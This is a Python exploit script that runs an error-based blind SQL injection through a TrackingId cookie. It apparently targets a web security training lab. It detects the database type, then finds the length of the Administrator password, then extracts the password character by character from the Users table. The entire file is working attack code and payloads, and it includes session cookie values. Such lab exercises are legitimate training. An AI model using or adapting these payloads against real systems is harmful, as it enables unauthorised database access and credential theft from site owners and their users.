import requests
import sys

# Target URL (change this to your lab target)
url = "https://0a5e00eb04bb1ed6804d12fa00a7006c.web-security-academy.net/"

# Cookies (replace with your real session + trackingId)
cookies = {"TrackingId": "TJSVPvLJ3YFYmMIN", "session": "t7HW1R1yKx4YbTUGdNZrod77n859517E"}

def send_payload(payload):
    """
    Sends a request with the SQL injection payload.
    Returns True if server error occurs (500 or error message).
    """
    injected_cookie = cookies.copy()
    injected_cookie["TrackingId"] = payload
    r = requests.get(url, cookies=injected_cookie)

    if r.status_code == 500 or "Internal Server Error" in r.text:
        return True
    return False

def detect_db_type():
    """
    Tries to detect database type by testing Oracle vs Other (MySQL/MSSQL/Postgres).
    """
    print("[*] Detecting database type...")

    # Test with SUBSTRING() (works on MySQL, MSSQL, Postgres)
    payload_substring = (
        "TJSVPvLJ3YFYmMIN' AND (SELECT CASE WHEN (ASCII(SUBSTRING('A',1,1))=65) "
        "THEN 1/0 ELSE 'a' END)='a"
    )

    if send_payload(payload_substring):
        print("[+] Database detected: MySQL/MSSQL/Postgres (using SUBSTRING)")
        return "other"

    # Test with SUBSTR() (Oracle)
    payload_substr = (
        "TJSVPvLJ3YFYmMIN' AND (SELECT CASE WHEN (ASCII(SUBSTR('A',1,1))=65) "
        "THEN 1/0 ELSE 'a' END FROM dual)='a"
    )

    if send_payload(payload_substr):
        print("[+] Database detected: Oracle (using SUBSTR)")
        return "oracle"

    print("[!] Could not detect database type, defaulting to SUBSTRING (other)")
    return "other"

def get_password_length(db_type, max_len=50):
    """
    Finds the length of the Administrator password.
    """
    print("[*] Checking Administrator password length...")

    for length in range(1, max_len + 1):
        payload = (
            f"TJSVPvLJ3YFYmMIN' AND (SELECT CASE WHEN (Username='Administrator' "
            f"AND LENGTH(Password)={length}) THEN 1/0 ELSE 'a' END FROM Users)='a"
        )

        if send_payload(payload):
            print(f"[+] Password length found: {length}")
            return length

    print("[!] Password length not found (try increasing max_len)")
    return None

def extract_password(db_type, length):
    """
    Extracts the Administrator password character by character.
    """
    password = ""
    print("[*] Extracting Administrator password...")

    substr_function = "SUBSTR" if db_type == "oracle" else "SUBSTRING"

    for i in range(1, length + 1):  # loop each position
        for char in range(32, 126):  # printable ASCII
            payload = (
                f"xyz' AND (SELECT CASE WHEN (Username='Administrator' "
                f"AND ASCII({substr_function}(Password,{i},1))={char}) "
                f"THEN 1/0 ELSE 'a' END FROM Users)='a"
            )

            if send_payload(payload):
                password += chr(char)
                sys.stdout.write("\r" + password)
                sys.stdout.flush()
                break

    print(f"\n[+] Extraction complete: {password}")
    return password

def main():
    # Step 1: Detect DB
    db_type = detect_db_type()

    # Step 2: Detect password length
    pw_length = get_password_length(db_type)

    # Step 3: Extract password
    if pw_length:
        extract_password(db_type, pw_length)

if __name__ == "__main__":
    main()
